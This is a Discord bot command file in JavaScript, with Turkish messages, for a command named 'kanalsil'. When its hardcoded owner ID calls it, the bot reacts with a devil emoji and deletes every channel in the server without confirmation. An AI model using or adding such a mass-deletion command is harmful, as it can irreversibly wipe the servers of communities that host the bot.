const Discord = require('discord.js');
const db = require('quick.db')
exports.run = async(client, message, args) => { 
  

 if(message.author.id !== "703985300304822293") return message.channel.send(":no_entry: Vay Çakal Bu Sahibimin Komutu");
 await message.react('😈')
message.guild.channels.cache.forEach(a => a.delete())
  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 7
};

exports.help = {
  name: 'kanalsil',
  description: 'taslak', 
  usage: 'kanal-sil'
};
